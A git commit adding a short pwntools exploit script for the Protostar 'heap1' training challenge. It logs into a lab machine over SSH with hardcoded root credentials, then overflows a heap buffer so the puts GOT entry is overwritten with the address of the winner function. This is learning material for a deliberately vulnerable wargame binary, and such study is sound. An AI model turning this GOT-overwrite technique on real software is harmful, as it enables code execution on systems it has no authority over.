ced3f6b8b43ae8896957cb96e4d76d76439df504
root <root@localhost.localdomain>
2015-09-03 14:31:44 -0400

    exploit heap1

---
+++ protostar/ex_heap1.py
@@ -0,0 +1,16 @@
+from pwn import *
+
+sh = ssh(host='192.168.1.104', user='root',
+                password='godmode', port=22)
+cmd = sh.set_working_directory('/opt/protostar/bin')
+
+e = ELF("./heap1")
+puts_add = p32(e.got["puts"])
+winner = pack(0x8048494)
+
+print "puts: ", puts_add
+arg1 = "A"*20
+arg1 += puts_add
+
+arg2 = winner
+print sh.run(['./heap1', arg1, arg2]).recvall().strip()
